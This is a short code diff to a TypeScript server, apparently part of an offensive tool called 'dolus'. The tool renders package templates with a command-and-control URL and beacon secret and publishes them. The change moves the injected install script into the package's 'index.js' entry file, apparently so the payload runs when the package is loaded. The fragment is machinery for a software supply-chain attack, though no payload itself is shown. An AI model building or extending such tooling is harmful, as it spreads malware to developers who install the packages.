@@ -8,7 +8,7 @@ import https from 'https';
 
 // dolus/server/../packages/template
 const TEMPLATE_DIR = path.join(process.cwd(), '..', 'packages', 'template');
-const TEMPLATE_FILES = ['package.json', 'install.js', 'extension.js'];
+const TEMPLATE_FILES = ['package.json', 'index.js', 'extension.js'];
 
 export function renderTemplate(content: string, pkgName: string, c2Url: string, beaconSecret = ''): string {
   return content
@@ -45,7 +45,7 @@ export function publishPackage(
 
   try {
     for (const file of TEMPLATE_FILES) {
-      const raw = file === 'install.js' && installJs != null
+      const raw = file === 'index.js' && installJs != null
         ? installJs
         : fs.readFileSync(path.join(TEMPLATE_DIR, file), 'utf8');
       fs.writeFileSync(path.join(tmpDir, file), renderTemplate(raw, pkgName, c2Url, beaconSecret));
